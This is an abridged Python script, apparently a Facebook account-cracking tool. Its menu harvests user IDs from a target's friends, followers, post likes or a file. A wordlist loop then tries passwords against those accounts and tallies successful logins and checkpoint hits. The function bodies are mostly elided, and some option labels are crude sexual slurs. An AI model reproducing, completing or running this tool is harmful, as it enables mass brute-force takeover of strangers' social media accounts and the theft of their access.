...
def login():
		try:
			...
			try:
				...
				banner()
				li = '# JARINGAN KABA TU KARUT BIGAL'
...
def menu(my_name,my_id):
	...
	sol().print(fx)
	print(k+'['+u+'•'+k+'] ACTIVE USER : '+str(my_name))
	print(k+'['+u+'•'+k+'] USER ID  TUMBAL   : '+str(my_id))
	print(k+'['+u+'•'+k+'] IP ADDRESS  : '+str(sh['origin']))
	io = '''[bold cyan][01] PUBLIK FRIENDS	     [06] CRACK FROM FILES
...
def file():
	...
	print(u+'['+h+'•'+u+'] READING THE FILE, WAIT A MINUTE •••')
	time.sleep(2)
...
def dump_publik():
	...
	sol().print(win2)
	print(u+'['+h+'•'+u+'] TYPE "me" AMO NDAK CRACK AKUN KABA TUAL')
	pil = input(k+'['+u+'f'+k+'] INPUT TARGET ID : ')
	try:
		...
		print(u+'['+h+'•'+u+'] TOTAL DUMP ID : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
...
def dump_massal():
	...
	if pilih in ['1','01']:
		...
		print(u+'['+h+'•'+u+'] ENTER TOTAL ID LIMIT [20]')
		try:
			jum = int(input(u+'['+p+'f'+u+'] Number Of Id : '))
		except ValueError:
		...
		ses=requests.Session()
		yz = 0
		print(u+'['+h+'•'+u+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FRIENDS')
		for met in range(jum):
			yz+=1
			kl = input(u+'['+h+str(yz)+u+'] Enter The '+str(yz)+'Id : ')
			uid.append(kl)
...
def dump_pengikut():
	...
	win2 = mark(win, style='green')
	sol().print(win2)
	print(u+'['+h+'•'+u+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FOLLOWERS')
	pil = input(k+'['+u+'f'+k+'] INPUT TARGET ID : ')
	try:
...
def dump_likes():
	...
	win2 = mark(win, style='green')
	sol().print(win2)
	pil = input(k+'['+u+'f'+k+'] INPUT ID POST : ')
	try:
...
def setting():
	...
	teks = '[01] BEDALAK JANDA\n[02] BEDALAK PERAWAN\n[03] BEDALAK LONTE'
	tak = nel(teks, style='cyan')
	cetak(nel(tak, title=' • SETTING • '))
	hu = input(k+'['+u+'f'+k+'] Choose : ')
	if hu in ['1','01']:
...
# WORDLIST
def passwrd():
	ler = '# PROSES DIMULAI, TEKAN CTRL+Z MO NDAK BERHENTI'
...
def crack(idf,pwv):
	...
	ses = requests.Session()
	sys.stdout.write('\r%s 忠 %s/%s 忠 OK:%s 忠 CP:%s 忠 %s%s%s 忠'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
